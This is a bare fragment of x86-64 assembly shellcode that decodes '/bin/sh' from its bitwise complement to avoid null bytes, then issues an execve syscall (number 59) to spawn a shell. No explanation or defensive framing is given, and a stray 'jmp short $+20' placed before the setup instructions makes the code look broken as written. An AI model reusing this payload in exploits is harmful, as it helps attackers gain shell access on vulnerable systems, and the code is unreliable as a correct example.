; complement of "/bin/sh\x00"
mov rbx, 0xff978cd091969dd0
not rbx
jmp short $+20

xor rsi, rsi
push 59
pop rax
push rbx
mov rdi, rsp

syscall